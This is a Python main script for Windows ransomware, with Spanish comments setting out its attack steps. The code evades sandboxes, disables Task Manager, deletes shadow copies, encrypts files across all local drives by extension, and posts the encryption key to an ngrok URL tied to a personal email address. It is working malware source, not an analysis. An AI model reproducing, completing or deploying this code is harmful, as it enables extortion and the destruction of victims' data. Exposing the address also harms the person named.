from re import S
from CryptoManager import CryptoManager
from VirtualEnvironmentDetector import VirtualEnvironmentDetector
import os
import sys

# Secuencia de acciones del Ransomware
# Paso 1 - En que sistema operativo o entorno se esta ejecutando el malware
# Paso 2 - Averiguar que sistemas de almacenamiento hay disponibles
# Paso 3 - Vamos a elevar privilegios, y daremos al programa los permisos de 'Full Control'
# Paso 4 - Necesitamos eliminar las copias de seguridad
# Paso 5 - Impedir que el sistema operativo reinicie en modo seguro
# Paso 6 - Borraremos los catalogos de las copias de seguridad
# Paso 7 - Miraremos de matar los procesos con bases de datos para garantizar el cifrado de estas
# Paso 8 - Dada la lista de dispositivos locales vamos a ir cifrando aquello que nos interese uno a uno (podemos mantener un set de extensiones o un set de carpetas de especial interes)
# Paso 9 - Una vez hemos encriptado todo debemos disponer la nota de rescate garantizando que se pueda realizar el pago

# Algunas preguntas
# a) Debemos garantizar la persistencia del malware en el dispositivo? => Por lo menos la herramienta para garantizar el pago y la desencriptacion de los datos

if __name__ == '__main__':
    print("Executing encryption protocol")

    # Algunas comprobaciones antes de iniciar el protocolo
    ved = VirtualEnvironmentDetector(dodelay=False)
    
    if not ved.is_windows():
        print('Nothing to do here...')
        sys.exit()

    if ved.neo_takes_blue_pill(tolerance=0):
        print('Exiting the matrix...')
        sys.exit()

    if ved.delay_anti_cuckoo(5*60):
        print("We are being analyzed...")
        sys.exit()

    cm = CryptoManager(action='encrypt')

    # TODO try except needed
    # WORKING PROPERLY
    cm.disable_task_manager()
    cm.delete_shadowcopies()
    print("Task manager disbled and shadow copies eliminated")

    local_drives = cm.get_local_drives()
    
    for ld in local_drives:
        for root, dirs, files in os.walk(ld):
            [dirs.remove(d) for d in list(dirs) if d in cm.PROTECTED_DIRS]
            for fn in files:
                full_path = root + os.sep + fn
                ext=cm.get_file_extension(full_path)
                if ext in cm.TARGET_EXT and ext not in cm.EXCLUDED_EXT:
                    print(full_path + ' -> [encrypted]')
                    cm.symmetric_encrypt_or_decrypt(full_path)

    cm.send_post_request(url='http://4b91c7321c2a.ngrok.io', mail='marcos.plaza.gonzalez@gmail.com', key=cm.key, state='infected')
    # cm.save_key_as_file() # Uncomment this if needed
    
    print('All data was successfully encrypted')

    


    

